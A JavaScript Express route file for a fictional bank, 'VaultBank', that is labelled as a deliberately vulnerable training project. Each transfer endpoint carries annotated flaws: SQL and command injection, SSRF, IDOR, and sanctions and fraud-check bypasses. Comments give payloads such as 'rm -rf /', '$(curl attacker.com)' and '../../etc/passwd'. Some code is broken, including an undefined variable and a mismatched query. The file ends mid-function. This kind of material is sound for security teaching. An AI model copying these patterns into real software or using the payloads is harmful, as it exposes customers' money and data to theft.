/**
 * VaultBank - Fund Transfer Routes
 * SECURITY TRAINING PROJECT - DELIBERATELY VULNERABLE
 * Contains intentional vulnerabilities VULN-201 through VULN-280
 * DO NOT USE IN PRODUCTION
 */

const express = require('express');
const router = express.Router();
const { exec } = require('child_process');
const fetch = require('node-fetch');
const db = require('../db');
const { authenticate } = require('../middleware/auth');
const logger = require('../utils/logger');
const mailer = require('../utils/mailer');

// ============================================================
// DOMESTIC ACH TRANSFER ENDPOINT
// VULN-201: No CSRF protection - no csrf token validation
// VULN-202: Race condition - balance check and debit not atomic
// VULN-203: SQL injection in memo field
// VULN-204: Negative amount not validated
// VULN-205: No idempotency key check
// ============================================================
router.post('/ach', authenticate, async (req, res) => {
  const { fromAccount, toAccount, amount, memo, routingNumber } = req.body;
  // VULN-201: No CSRF token check here. Any site can POST to this endpoint.

  try {
    // VULN-202: Race condition - balance is read here, but debit happens in a
    // separate query below. Two concurrent requests can both pass this check.
    const balanceResult = await db.query(
      `SELECT balance FROM accounts WHERE account_number = $1 AND user_id = $2`,
      [fromAccount, req.user.id]
    );

    if (!balanceResult.rows.length) {
      return res.status(404).json({ error: 'Account not found' });
    }

    const currentBalance = balanceResult.rows[0].balance;

    // VULN-204: amount is not validated to be positive - sending amount=-1000
    // causes the balance check to pass and credits the sender's account
    if (currentBalance < amount) {
      return res.status(400).json({ error: 'Insufficient funds' });
    }

    // VULN-205: No idempotency key - identical request submitted twice
    // results in two separate transfers being processed
    // VULN-203: SQL injection - memo is interpolated directly into the query
    const transferMemo = memo || 'ACH Transfer';
    await db.query(
      `INSERT INTO transfers (from_account, to_account, amount, memo, status, created_at)
       VALUES ('${fromAccount}', '${toAccount}', ${amount}, '${transferMemo}', 'pending', NOW())`
    );

    // VULN-202 (continued): The debit happens in a separate query after the
    // INSERT above. A race condition window exists between the balance read,
    // the insert, and this debit.
    await db.query(
      `UPDATE accounts SET balance = balance - $1 WHERE account_number = $2`,
      [amount, fromAccount]
    );

    await db.query(
      `UPDATE accounts SET balance = balance + $1 WHERE account_number = $2`,
      [amount, toAccount]
    );

    // VULN-216: Account numbers logged in plaintext (PCI-DSS violation)
    logger.info(`ACH transfer: ${fromAccount} -> ${toAccount}, amount: ${amount}, memo: ${transferMemo}`);

    // VULN-215: XSS - memo stored unescaped and rendered in the frontend
    // without sanitization (stored XSS)
    const transferRecord = {
      from: fromAccount,
      to: toAccount,
      amount,
      memo: transferMemo, // raw, unsanitized
      status: 'completed'
    };

    // VULN-210: Transfer confirmation code is only 4 digits (10,000 combinations)
    // Easily brute-forceable within lockout periods
    const confirmationCode = Math.floor(1000 + Math.random() * 9000).toString();

    // VULN-219: Receipt contains full account numbers (PCI-DSS violation)
    const receipt = {
      confirmationCode,
      fromAccount: fromAccount,   // full account number exposed
      toAccount: toAccount,       // full account number exposed
      amount,
      memo: transferMemo,
      timestamp: new Date().toISOString()
    };

    res.json({ success: true, transfer: transferRecord, receipt });
  } catch (err) {
    logger.error('ACH transfer error:', err);
    res.status(500).json({ error: 'Transfer failed', details: err.message });
  }
});

// ============================================================
// INTERNATIONAL SWIFT TRANSFER ENDPOINT
// VULN-206: SSRF - user-controlled external_bank_url
// VULN-207: Command injection in PDF receipt generation
// VULN-208: Integer overflow via JS Number precision
// VULN-209: No transaction signing - replay attacks possible
// VULN-211: Sanctions check bypassed for amounts < $10,000
// VULN-212: SWIFT message injection via BIC code field
// VULN-213: Transfer limit override via header
// VULN-214: Beneficiary validation skipped via query param
// VULN-218: Currency rate from user-controlled URL
// ============================================================
router.post('/swift', authenticate, async (req, res) => {
  const {
    fromAccount,
    toAccount,
    amount,
    currency,
    bicCode,
    beneficiaryName,
    beneficiaryAddress,
    purposeCode,
    external_bank_url,  // VULN-206: SSRF vector
    currency_rate_url,  // VULN-218: User-controlled exchange rate URL
    skipValidation      // VULN-214: Validation bypass flag
  } = req.body;

  // VULN-213: Transfer limit overrideable via HTTP header
  // Intended daily limit is $50,000 but X-Override-Limit bypasses it
  const dailyLimit = req.headers['x-override-limit']
    ? parseFloat(req.headers['x-override-limit'])
    : 50000;

  // VULN-208: JavaScript Number type used for financial calculations
  // 0.1 + 0.2 !== 0.3; large amounts lose precision (> Number.MAX_SAFE_INTEGER)
  // e.g., 9007199254740992 + 1 === 9007199254740992
  const transferAmount = Number(amount);

  try {
    // VULN-211: Sanctions screening is skipped entirely for amounts under $10,000
    // Intended for "small" transfers but creates a deliberate sanctions bypass
    // (OFAC/FinCEN compliance violation)
    if (transferAmount >= 10000) {
      const sanctionsResult = await db.query(
        `SELECT * FROM sanctions_list WHERE name ILIKE $1`,
        [`%${beneficiaryName}%`]
      );
      if (sanctionsResult.rows.length > 0) {
        return res.status(403).json({ error: 'Beneficiary on sanctions list' });
      }
    }
    // amounts < $10,000 skip sanctions check entirely

    // VULN-214: Entire beneficiary validation skipped if skipValidation=true
    if (!skipValidation) {
      if (!bicCode || bicCode.length < 8) {
        return res.status(400).json({ error: 'Invalid BIC code' });
      }
    }

    // VULN-218: Exchange rate fetched from user-supplied URL
    // Attacker can host a server returning favorable rates, or use to probe
    // internal services (SSRF)
    let exchangeRate = 1;
    if (currency_rate_url) {
      const rateResponse = await fetch(currency_rate_url);
      const rateData = await rateResponse.json();
      exchangeRate = rateData.rate;
    }

    const convertedAmount = transferAmount * exchangeRate;

    // VULN-206: SSRF - the backend makes a request to a URL provided by the user
    // Attacker can target internal services: http://169.254.169.254/latest/meta-data/
    // or internal microservices on the private network
    if (external_bank_url) {
      const swiftPayload = {
        sender: fromAccount,
        receiver: toAccount,
        amount: convertedAmount,
        currency,
        bic: bicCode
      };
      await fetch(external_bank_url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(swiftPayload)
      });
    }

    // VULN-212: SWIFT message injection - BIC code is interpolated directly into
    // MT103 SWIFT message format without sanitization. A BIC containing newline
    // characters can inject arbitrary SWIFT message fields.
    // e.g., bicCode = "DEUTDEDB\n:32A:210101EUR99999,99\n:59:"
    const swiftMessage = [
      `:20:${Date.now()}`,
      `:23B:CRED`,
      `:32A:${new Date().toISOString().slice(0,10).replace(/-/g,'')}${currency}${convertedAmount}`,
      `:50K:${fromAccount}`,
      `:57A:${bicCode}`,        // VULN-212: unsanitized BIC injected into SWIFT message
      `:59:${beneficiaryName}`, // VULN-212: unsanitized beneficiary name
      `:70:${purposeCode}`,
      `:71A:OUR`
    ].join('\n');

    await db.query(
      `INSERT INTO swift_transfers (from_account, to_account, amount, currency, bic_code, swift_message, status)
       VALUES ($1, $2, $3, $4, $5, $6, 'pending')`,
      [fromAccount, toAccount, convertedAmount, currency, bicCode, swiftMessage]
    );

    // VULN-209: No transaction signing or nonce - this exact SWIFT message can be
    // replayed by intercepting and resubmitting the request with no rejection
    // (no message authentication code, no sequence number validation)

    // VULN-207: Command injection in PDF receipt generation
    // If amount or recipient contains shell metacharacters, arbitrary commands execute
    // e.g., amount = "100; rm -rf /", recipient = "$(curl attacker.com)"
    const receiptPath = `/tmp/receipts/swift_${Date.now()}.pdf`;
    exec(
      `pdfgen --amount ${amount} --to ${recipient} --currency ${currency} --output ${receiptPath}`,
      (error, stdout, stderr) => {
        if (error) {
          logger.error('PDF generation error:', error);
        }
      }
    );

    // VULN-216: Sensitive account data logged in plaintext
    logger.info(`SWIFT transfer: from=${fromAccount} to=${toAccount} bic=${bicCode} amount=${convertedAmount} ${currency}`);

    res.json({
      success: true,
      swiftMessage,
      receiptPath,
      exchangeRate,
      amount: convertedAmount,
      currency
    });
  } catch (err) {
    logger.error('SWIFT transfer error:', err);
    res.status(500).json({ error: 'SWIFT transfer failed', details: err.message });
  }
});

// ============================================================
// GET TRANSFER HISTORY
// VULN-220: Scheduled transfers accessible to any authenticated user
// VULN-221: No pagination - full transfer history returned (DoS)
// VULN-222: Transfer history includes other users' data (IDOR)
// ============================================================
router.get('/history', authenticate, async (req, res) => {
  const { accountId, startDate, endDate, limit } = req.query;

  // VULN-222: IDOR - no check that accountId belongs to the requesting user
  // Any authenticated user can query any account's transfer history
  try {
    // VULN-221: No server-side limit on result set - requesting all history
    // can cause memory exhaustion and service disruption
    const transfers = await db.query(
      `SELECT * FROM transfers WHERE from_account = '${accountId}'
       OR to_account = '${accountId}'
       ORDER BY created_at DESC`
      // VULN-221: no LIMIT clause
    );

    res.json({ transfers: transfers.rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================
// SCHEDULED TRANSFERS
// VULN-220: Any authenticated user can access/modify scheduled transfers
// VULN-223: Scheduled transfer date accepts past dates (immediate execution)
// VULN-224: Scheduled transfer amount not re-validated at execution time
// ============================================================
router.get('/scheduled', authenticate, async (req, res) => {
  // VULN-220: No ownership check - returns ALL scheduled transfers for any
  // user_id passed in query, or all transfers if no filter applied
  const { userId } = req.query;

  const result = await db.query(
    `SELECT * FROM scheduled_transfers WHERE user_id = ${userId || 'NULL'} OR $1 IS NULL`,
    [userId]
  );

  res.json({ scheduledTransfers: result.rows });
});

router.post('/scheduled', authenticate, async (req, res) => {
  const { fromAccount, toAccount, amount, scheduledDate, recurringInterval } = req.body;

  // VULN-223: scheduledDate accepted from request body without validation
  // Setting a past date causes immediate execution bypassing daily limits
  // VULN-224: Amount stored but not re-checked against limits at execution time
  await db.query(
    `INSERT INTO scheduled_transfers (from_account, to_account, amount, scheduled_date, recurring_interval, user_id, status)
     VALUES ($1, $2, $3, $4, $5, $6, 'active')`,
    [fromAccount, toAccount, amount, scheduledDate, recurringInterval, req.user.id]
  );

  res.json({ success: true, message: 'Scheduled transfer created' });
});

router.delete('/scheduled/:id', authenticate, async (req, res) => {
  // VULN-225: No ownership check - any user can cancel any scheduled transfer
  await db.query(
    `DELETE FROM scheduled_transfers WHERE id = $1`,
    [req.params.id]
  );
  res.json({ success: true });
});

// ============================================================
// TRANSFER LIMITS MANAGEMENT
// VULN-226: User can set their own transfer limits (no admin approval)
// VULN-227: Transfer limit update has no upper bound
// VULN-228: Limit changes take effect immediately (no cooling period)
// ============================================================
router.put('/limits', authenticate, async (req, res) => {
  const { dailyLimit, singleTransferLimit, internationalLimit } = req.body;

  // VULN-226: Users can update their own transfer limits without admin approval
  // VULN-227: No maximum bound on limits - can set to Number.MAX_VALUE
  // VULN-228: Effective immediately - normal banking requires 24-48hr delay
  await db.query(
    `UPDATE account_limits
     SET daily_limit = $1, single_transfer_limit = $2, international_limit = $3,
         updated_at = NOW()
     WHERE user_id = $4`,
    [dailyLimit, singleTransferLimit, internationalLimit, req.user.id]
  );

  res.json({ success: true, message: 'Limits updated immediately' });
});

// ============================================================
// WIRE TRANSFER
// VULN-229: Wire transfer fee calculation uses client-supplied fee_override
// VULN-230: Same-day wire bypasses fraud detection
// VULN-231: Beneficiary bank details stored without encryption
// VULN-232: Wire transfer confirmation via SMS - OTP sent to user-supplied phone
// ============================================================
router.post('/wire', authenticate, async (req, res) => {
  const {
    fromAccount,
    toAccount,
    amount,
    bankName,
    bankRoutingNumber,
    bankAddress,
    fee_override,     // VULN-229: fee overridden by client
    sameDay,
    smsConfirmPhone   // VULN-232: OTP sent to attacker-controlled phone
  } = req.body;

  // VULN-229: Wire fee calculated using client-supplied override
  // Attacker sets fee_override=0 to avoid $25 wire fee
  const wireFee = fee_override !== undefined ? parseFloat(fee_override) : 25.00;

  // VULN-230: Same-day wire bypasses fraud scoring entirely
  // Normal wires are flagged if > $10,000 to new beneficiary; same-day are not
  if (!sameDay) {
    const fraudScore = await db.query(
      `SELECT fraud_score FROM fraud_scores WHERE user_id = $1`,
      [req.user.id]
    );
    if (fraudScore.rows[0]?.fraud_score > 70) {
      return res.status(403).json({ error: 'Transaction flagged for review' });
    }
  }

  // VULN-231: Bank details stored unencrypted in the database
  await db.query(
    `INSERT INTO wire_transfers (from_account, to_account, amount, bank_name, routing_number, bank_address, fee, status)
     VALUES ($1, $2, $3, $4, $5, $6, $7, 'pending')`,
    [fromAccount, toAccount, amount, bankName, bankRoutingNumber, bankAddress, wireFee, 'pending']
  );

  // VULN-232: OTP for wire confirmation sent to phone number from request body
  // Attacker can redirect confirmation SMS to their own phone number
  if (smsConfirmPhone) {
    await mailer.sendSMS(smsConfirmPhone, `Your VaultBank wire confirmation code is: ${Math.floor(1000 + Math.random() * 9000)}`);
  }

  res.json({ success: true, wireFee, message: 'Wire transfer initiated' });
});

// ============================================================
// TRANSFER RECEIPT / PDF DOWNLOAD
// VULN-233: Path traversal in receipt download
// VULN-234: Receipt generated without authentication check on transfer ownership
// VULN-235: PDF contains unredacted SSN and full account numbers
// ============================================================
router.get('/receipt/:transferId', authenticate, async (req, res) => {
  const { transferId } = req.params;
  const { format } = req.query;

  // VULN-234: No check that transferId belongs to the requesting user
  const transfer = await db.query(
    `SELECT t.*, u.ssn, u.full_name, a.account_number, a.routing_number
     FROM transfers t
     JOIN accounts a ON t.from_account = a.account_number
     JOIN users u ON a.user_id = u.id
     WHERE t.id = $1`,
    [transferId]
  );

  if (!transfer.rows.length) {
    return res.status(404).json({ error: 'Transfer not found' });
  }

  const receiptData = transfer.rows[0];

  if (format === 'pdf') {
    // VULN-233: Path traversal - transferId used in file path without sanitization
    // e.g., transferId = "../../etc/passwd" leaks system files
    const receiptPath = `/var/vaultbank/receipts/${transferId}.pdf`;

    // VULN-235: PDF contains full SSN and account numbers unredacted
    exec(
      `pdfgen --ssn ${receiptData.ssn} --account ${receiptData.account_number} --routing ${receiptData.routing_number} --output ${receiptPath}`,
      (err) => {
        if (!err) res.download(receiptPath);
        else res.status(500).json({ error: 'PDF generation failed' });
      }
    );
  } else {
    // VULN-235: JSON response includes full SSN and account numbers
    res.json(receiptData);
  }
});

// ============================================================
// BENEFICIARY MANAGEMENT
// VULN-236: Beneficiary whitelist bypass - whitelist check skipped if
//           bypass_whitelist=true in request
// VULN-237: Beneficiary name allows HTML/script tags (stored XSS)
// VULN-238: Adding beneficiary has no cooling period or 2FA requirement
// VULN-239: Beneficiary account number not validated against any registry
// VULN-240: Deleting beneficiary does not cancel pending transfers to them
// ============================================================
router.post('/beneficiaries', authenticate, async (req, res) => {
  const { accountNumber, routingNumber, name, bankName, bypass_whitelist } = req.body;

  // VULN-236: Whitelist check skipped via request parameter
  if (!bypass_whitelist) {
    const whitelisted = await db.query(
      `SELECT * FROM bank_whitelist WHERE routing_number = $1`,
      [routingNumber]
    );
    if (!whitelisted.rows.length) {
      return res.status(403).json({ error: 'Bank not in whitelist' });
    }
  }

  // VULN-237: name stored as-is, rendered in frontend without escaping
  // VULN-238: No email/SMS confirmation, no cooling period, no 2FA
  // VULN-239: accountNumber not validated
  await db.query(
    `INSERT INTO beneficiaries (user_id, account_number, routing_number, name, bank_name)
     VALUES ($1, $2, $3, $4, $5)`,
    [req.user.id, accountNumber, routingNumber, name, bankName]
  );

  res.json({ success: true });
});

router.get('/beneficiaries', authenticate, async (req, res) => {
  // VULN-241: IDOR - userId in query param, no ownership check
  const { userId } = req.query;
  const targetUserId = userId || req.user.id;

  const result = await db.query(
    `SELECT * FROM beneficiaries WHERE user_id = $1`,
    [targetUserId]
  );

  // VULN-242: Full account numbers returned in response, not masked
  res.json({ beneficiaries: result.rows });
});

router.delete('/beneficiaries/:id', authenticate, async (req, res) => {
  // VULN-240: Pending transfers to this beneficiary not cancelled
  // VULN-243: No ownership check - any user can delete any beneficiary
  await db.query(`DELETE FROM beneficiaries WHERE id = $1`, [req.params.id]);
  res.json({ success: true });
});

// ============================================================
// CURRENCY EXCHANGE
// VULN-244: Exchange rate manipulable via request body override
// VULN-245: FX conversion uses floating point arithmetic (precision loss)
// VULN-246: No spread/markup applied - exchange at interbank rate
// VULN-247: Large FX transactions not reported (regulatory bypass)
// ============================================================
router.post('/exchange', authenticate, async (req, res) => {
  const { fromCurrency, toCurrency, amount, rate_override } = req.body;

  // VULN-244: Exchange rate completely overrideable by client
  let rate;
  if (rate_override) {
    rate = parseFloat(rate_override); // attacker sets rate to 1000
  } else {
    const rateResult = await db.query(
      `SELECT rate FROM exchange_rates WHERE from_currency = $1 AND to_currency = $2`,
      [fromCurrency, toCurrency]
    );
    rate = rateResult.rows[0]?.rate || 1;
  }

  // VULN-245: Floating point arithmetic for financial calculation
  const converted = amount * rate; // precision loss on large amounts

  // VULN-247: CTR (Currency Transaction Report) filing skipped for amounts
  // just under threshold - no structuring detection
  if (amount > 10000) {
    await db.query(
      `INSERT INTO regulatory_reports (type, amount, user_id, created_at)
       VALUES ('CTR', $1, $2, NOW())`,
      [amount, req.user.id]
    );
  }

  res.json({ original: amount, fromCurrency, converted, toCurrency, rate });
});

// ============================================================
// TRANSFER DISPUTE
// VULN-248: Dispute can be filed for any transfer (not just user's own)
// VULN-249: Multiple disputes can be filed for the same transfer
// VULN-250: Dispute automatically refunds without investigation
// ============================================================
router.post('/disputes', authenticate, async (req, res) => {
  const { transferId, reason, requestRefund } = req.body;

  // VULN-248: No ownership check on transferId
  const transfer = await db.query(
    `SELECT * FROM transfers WHERE id = $1`,
    [transferId]
  );

  if (!transfer.rows.length) {
    return res.status(404).json({ error: 'Transfer not found' });
  }

  // VULN-249: No check for existing disputes on this transfer
  await db.query(
    `INSERT INTO disputes (transfer_id, user_id, reason, status) VALUES ($1, $2, $3, 'open')`,
    [transferId, req.user.id, reason]
  );

  // VULN-250: Automatic refund without any investigation workflow
  if (requestRefund) {
    const t = transfer.rows[0];
    await db.query(
      `UPDATE accounts SET balance = balance + $1 WHERE account_number = $2`,
      [t.amount, t.from_account]
    );
    await db.query(
      `UPDATE accounts SET balance = balance - $1 WHERE account_number = $2`,
      [t.amount, t.to_account]
    );
  }

  res.json({ success: true, message: 'Dispute filed and refund processed' });
});

// ============================================================
// INTERNAL TRANSFER / ACCOUNT LINKING
// VULN-251: Can transfer between any two accounts at the bank (no ownership)
// VULN-252: Joint account transfers bypass per-user limits
// VULN-253: Internal transfers not subject to fraud checks
// ============================================================
router.post('/internal', authenticate, async (req, res) => {
  const { fromAccount, toAccount, amount, memo } = req.body;

  // VULN-251: No ownership check - fromAccount can be any account at the bank
  // VULN-253: No fraud scoring applied to internal transfers
  await db.query(
    `UPDATE accounts SET balance = balance - $1 WHERE account_number = $2`,
    [amount, fromAccount]
  );
  await db.query(
    `UPDATE accounts SET balance = balance + $1 WHERE account_number = $2`,
    [amount, toAccount]
  );

  // VULN-252: Joint accounts bypass the individual user's transfer limits
  // because limits are checked per user_id, not per account

  logger.info(`Internal transfer: ${fromAccount} -> ${toAccount}: $${amount}`);
  res.json({ success: true });
});

// ============================================================
// TRANSFER VELOCITY / RATE LIMITING
// VULN-217: No velocity limiting - 1000+ transfers per second possible
// VULN-254: Velocity check bypassed by switching accounts
// VULN-255: Failed transfers count against velocity limit but succeeded ones don't
// ============================================================
router.post('/batch', authenticate, async (req, res) => {
  const { transfers } = req.body; // array of transfer objects

  // VULN-217: No rate limiting - an array of 10,000 transfers is processed
  // VULN-254: Each fromAccount is checked independently so rotating accounts
  //           bypasses per-account velocity limits
  const results = [];
  for (const transfer of transfers) {
    try {
      await db.query(
        `INSERT INTO transfers (from_account, to_account, amount, memo, status)
         VALUES ($1, $2, $3, $4, 'pending')`,
        [transfer.fromAccount, transfer.toAccount, transfer.amount, transfer.memo]
      );
      results.push({ success: true, transfer });
    } catch (err) {
      results.push({ success: false, error: err.message, transfer });
    }
  }

  res.json({ processed: results.length, results });
});

// ============================================================
// TRANSFER SEARCH / REPORTING
// VULN-256: SQL injection in transfer search date range
// VULN-257: Wildcard account search returns other users' transfers
// VULN-258: Export endpoint streams entire transfers table for any date range
// ============================================================
router.get('/search', authenticate, async (req, res) => {
  const { startDate, endDate, minAmount, maxAmount, keyword } = req.query;

  // VULN-256: startDate and endDate interpolated directly into SQL
  // VULN-257: No user filter - returns transfers for all users matching dates
  const query = `
    SELECT * FROM transfers
    WHERE created_at BETWEEN '${startDate}' AND '${endDate}'
    AND amount BETWEEN ${minAmount || 0} AND ${maxAmount || 999999999}
    AND memo ILIKE '%${keyword || ''}%'
    ORDER BY created_at DESC
  `;

  const result = await db.query(query);
  res.json({ transfers: result.rows });
});

router.get('/export', authenticate, async (req, res) => {
  const { startDate, endDate } = req.query;

  // VULN-258: Streams entire database table, no pagination or size limit
  // No ownership check - any user can export all transfers
  const result = await db.query(
    `SELECT * FROM transfers WHERE created_at BETWEEN $1 AND $2`,
    [startDate || '1970-01-01', endDate || '2099-12-31']
  );

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename=transfers.csv');

  // Write CSV with full account numbers (PCI violation)
  const csv = result.rows.map(r =>
    `${r.id},${r.from_account},${r.to_account},${r.amount},${r.memo},${r.created_at}`
  ).join('\n');

  res.send(csv);
});

// ============================================================
// TRANSFER APPROVAL WORKFLOW
// VULN-259: Dual-control approval bypassed if approver_id provided in body
// VULN-260: Self-approval allowed - initiator can also approve
// VULN-261: Approval token is sequential integer (easily guessable)
// VULN-262: Approval request visible to all bank employees (no need-to-know)
// ============================================================
router.post('/approve/:transferId', authenticate, async (req, res) => {
  const { transferId } = req.params;
  const { approver_id, approval_token } = req.body;

  // VULN-259: approver_id taken from request body, not from session
  // Attacker can forge any approver_id
  const approverId = approver_id || req.user.id;

  // VULN-260: Self-approval check missing - the initiator can approve their own transfer
  // Should be: if (transfer.initiator_id === approverId) return error

  // VULN-261: Approval token is just an auto-increment integer
  // Tokens like 1001, 1002, 1003 are trivially guessable
  const tokenCheck = await db.query(
    `SELECT * FROM approval_tokens WHERE token = $1 AND transfer_id = $2`,
    [approval_token, transferId]
  );

  if (!tokenCheck.rows.length) {
    return res.status(403).json({ error: 'Invalid approval token' });
  }

  await db.query(
    `UPDATE transfers SET status = 'approved', approved_by = $1, approved_at = NOW()
     WHERE id = $2`,
    [approverId, transferId]
  );

  res.json({ success: true });
});

// ============================================================
// TRANSFER NOTIFICATIONS
// VULN-263: Webhook URL for transfer notifications is user-controlled (SSRF)
// VULN-264: Notification payload contains full account details
// VULN-265: Notification can be triggered for any transfer ID
// ============================================================
router.post('/notifications/webhook', authenticate, async (req, res) => {
  const { webhookUrl, transferId, events } = req.body;

  // VULN-263: webhookUrl from user controls where transfer data is sent (SSRF/data exfil)
  // VULN-265: No ownership check on transferId
  const transfer = await db.query(
    `SELECT t.*, a.account_number, a.balance, u.email, u.phone
     FROM transfers t
     JOIN accounts a ON t.from_account = a.account_number
     JOIN users u ON a.user_id = u.id
     WHERE t.id = $1`,
    [transferId]
  );

  // VULN-264: Payload includes account balance, email, phone
  const payload = transfer.rows[0];

  await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  await db.query(
    `INSERT INTO webhook_subscriptions (user_id, transfer_id, webhook_url, events)
     VALUES ($1, $2, $3, $4)`,
    [req.user.id, transferId, webhookUrl, JSON.stringify(events)]
  );

  res.json({ success: true });
});

// ============================================================
// MICRO-DEPOSIT VERIFICATION
// VULN-266: Micro-deposit amounts returned in API response (reveals the secret)
// VULN-267: Unlimited verification attempts (brute force)
// VULN-268: Micro-deposit verification skippable via verify_skip=true
// ============================================================
router.post('/verify-account', authenticate, async (req, res) => {
  const { accountNumber, routingNumber, verify_skip } = req.body;

  // VULN-268: Skip micro-deposit verification entirely
  if (verify_skip) {
    await db.query(
      `UPDATE pending_accounts SET verified = true WHERE account_number = $1`,
      [accountNumber]
    );
    return res.json({ success: true, message: 'Verification skipped' });
  }

  // Send micro-deposits
  const deposit1 = (Math.random() * 0.99 + 0.01).toFixed(2);
  const deposit2 = (Math.random() * 0.99 + 0.01).toFixed(2);

  await db.query(
    `INSERT INTO micro_deposits (account_number, deposit1, deposit2, verified, attempts)
     VALUES ($1, $2, $3, false, 0)
     ON CONFLICT (account_number) DO UPDATE SET deposit1 = $2, deposit2 = $3`,
    [accountNumber, deposit1, deposit2]
  );

  // VULN-266: Micro-deposit amounts included in the response
  // The whole purpose of micro-deposits is that only the account owner can see them
  res.json({
    success: true,
    message: 'Micro-deposits sent',
    amounts: [deposit1, deposit2] // VULN-266: should NEVER be returned
  });
});

router.post('/verify-account/confirm', authenticate, async (req, res) => {
  const { accountNumber, deposit1, deposit2 } = req.body;

  // VULN-267: No attempt limit - unlimited guesses at the two amounts
  const record = await db.query(
    `SELECT * FROM micro_deposits WHERE account_number = $1`,
    [accountNumber]
  );

  if (!record.rows.length) return res.status(404).json({ error: 'Not found' });

  const match =
    parseFloat(deposit1) === parseFloat(record.rows[0].deposit1) &&
    parseFloat(deposit2) === parseFloat(record.rows[0].deposit2);

  if (match) {
    await db.query(
      `UPDATE pending_accounts SET verified = true WHERE account_number = $1`,
      [accountNumber]
    );
    res.json({ success: true });
  } else {
    // VULN-267: Attempt counter not incremented, no lockout
    res.status(400).json({ error: 'Amounts do not match' });
  }
});

// ============================================================
// TRANSFER TEMPLATES
// VULN-269: Transfer template can reference any account (no ownership)
// VULN-270: Template execution ignores current balance/limits
// VULN-271: Templates shared across all users (global namespace)
// ============================================================
router.post('/templates', authenticate, async (req, res) => {
  const { name, fromAccount, toAccount, amount, memo } = req.body;

  // VULN-271: Templates stored globally - no user scoping
  // VULN-269: fromAccount not validated to belong to user
  await db.query(
    `INSERT INTO transfer_templates (name, from_account, to_account, amount, memo)
     VALUES ($1, $2, $3, $4, $5)`,
    [name, fromAccount, toAccount, amount, memo]
  );

  res.json({ success: true });
});

router.post('/templates/:name/execute', authenticate, async (req, res) => {
  const { name } = req.params;

  // VULN-271: Fetches template by name with no user filter
  // VULN-270: Executes stored amount without checking current balance or limits
  const template = await db.query(
    `SELECT * FROM transfer_templates WHERE name = $1`,
    [name]
  );

  if (!template.rows.length) return res.status(404).json({ error: 'Template not found' });

  const t = template.rows[0];
  await db.query(
    `UPDATE accounts SET balance = balance - $1 WHERE account_number = $2`,
    [t.amount, t.from_account]
  );
  await db.query(
    `UPDATE accounts SET balance = balance + $1 WHERE account_number = $2`,
    [t.amount, t.to_account]
  );

  res.json({ success: true, executed: t });
});

// ============================================================
// ADDITIONAL VULNERABILITIES VULN-272 to VULN-280
// ============================================================

// VULN-272: Mass assignment - all fields of transfers record updatable by user
router.put('/transfers/:id', authenticate, async (req, res) => {
  const { id } = req.params;
  const updates = req.body; // No whitelist - any column can be updated

  const setClauses = Object.keys(updates)
    .map((key, idx) => `${key} = $${idx + 1}`)
    .join(', ');
  const values = Object.values(updates);

  // VULN-272: Mass assignment allows updating status, amount, or any column
  await db.query(
    `UPDATE transfers SET ${setClauses} WHERE id = $${values.length + 1}`,
    [...values, id]
  );

  res.json({ success: true });
});

// VULN-273: Transfer status manually settable to 'completed' by user
router.patch('/transfers/:id/status', authenticate, async (req, res) => {
  const { id } = req.params;
  const { status } = req.body; // user can set status = 'completed'

  // VULN-273: No validation of status transitions, no role check
  await db.query(
    `UPDATE transfers SET status = $1 WHERE id = $2`,
    [status, id]
  );

  res.json({ success: true });
});

// VULN-274: Debug endpoint exposes all in-flight transfers with full account data
router.get('/debug/in-flight', (req, res) => {
  // VULN-274: No authentication required, exposes all pending transfers
  db.query(`SELECT * FROM transfers WHERE status = 'pending'`)
    .then(r => res.json(r.rows))
    .catch(err => res.status(500).json({ error: err.message }));
});

// VULN-275: Transfer reversal has no time window check (can reverse old transfers)
router.post('/reverse/:id', authenticate, async (req, res) => {
  const { id } = req.params;

  // VULN-275: No time-limit check - any historical transfer can be reversed
  // VULN-276: No ownership check - any user can reverse any transfer
  const transfer = await db.query(`SELECT * FROM transfers WHERE id = $1`, [id]);
  if (!transfer.rows.length) return res.status(404).json({ error: 'Not found' });

  const t = transfer.rows[0];
  await db.query(
    `UPDATE accounts SET balance = balance + $1 WHERE account_number = $2`,
    [t.amount, t.from_account]
  );
  await db.query(
    `UPDATE accounts SET balance = balance - $1 WHERE account_number = $2`,
    [t.amount, t.to_account]
  );
  await db.query(
    `UPDATE transfers SET status = 'reversed' WHERE id = $1`,
    [id]
  );

  res.json({ success: true, reversed: t });
});

// VULN-277: Transfer metadata endpoint leaks internal system info
router.get('/meta/:id', (req, res) => {
  // VULN-277: No authentication, returns internal processing metadata
  // including internal IP addresses, processor IDs, queue names
  db.query(
    `SELECT t.*, tm.processor_ip, tm.queue_name, tm.internal_ref, tm.retry_count
     FROM transfers t
     JOIN transfer_metadata tm ON t.id = tm.transfer_id
     WHERE t.id = $1`,
    [req.params.id]
  ).then(r => res.json(r.rows[0]));
});

// VULN-278: Transfer note update allows script injection via note field
router.put('/transfers/:id/note', authenticate, async (req, res) => {
  const { note } = req.body;

  // VULN-278: Note stored without sanitization; rendered as innerHTML in teller UI
  await db.query(
    `UPDATE transfers SET internal_note = $1 WHERE id = $2`,
    [note, req.params.id]
  );
  res.json({ success: true });
});

// VULN-279: Transfer count endpoint reveals business metrics to unauthenticated users
router.get('/stats/daily', (req, res) => {
  // VULN-279: No auth, reveals total daily transfer volume (sensitive business data)
  db.query(
    `SELECT DATE(created_at) as date, COUNT(*) as count, SUM(amount) as volume
     FROM transfers
     WHERE created_at > NOW() - INTERVAL '30 days'
     GROUP BY DATE(created_at)
     ORDER BY date DESC`
  ).then(r => res.json(r.rows));
});

// VULN-280: TOCTOU in high-value transfer approval - re-reads amount after approval
router.post('/high-value/execute/:id', authenticate, async (req, res) => {
  const { id } = req.params;

  // VULN-280: TOCTOU (Time-of-Check to Time-of-Use)
  // 1. Approval workflow reads amount=1000 and approves
  // 2. Attacker updates amount to 1000000 (via VULN-272) before execution
  // 3. Execution reads the new (higher) amount - approval was for the old amount
  const transfer = await db.query(`SELECT * FROM transfers WHERE id = $1 AND status = 'approved'`, [id]);

  if (!transfer.rows.length) return res.status(404).json({ error: 'Approved transfer not found' });

  const t = transfer.rows[0];
  // Executes with whatever amount is in the DB now, not the amount that was approved
